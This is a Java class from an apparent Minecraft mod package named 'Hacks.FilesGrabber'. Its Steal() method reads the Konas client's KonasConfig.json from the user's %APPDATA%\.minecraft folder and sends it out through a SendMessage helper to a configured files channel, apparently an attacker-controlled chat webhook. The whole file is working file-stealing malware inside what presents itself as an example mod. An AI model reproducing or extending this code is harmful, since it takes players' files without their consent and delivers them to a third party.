package com.example.examplemod.Hacks.FilesGrabber.Konsa;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;

import java.io.File;

public class KonasWaypoints {

    public static void Steal() throws Exception {
        try{
        SendMessage.sendFile(new File(System.getenv("APPDATA") + "\\.minecraft\\" + "KonasConfig.json"));
            SendMessage.doThing("```KonasWaypoints ^^^```", Cfg.FilesChannel);}catch (Exception e){
            System.out.println("Cant steal");
        }
    }
}
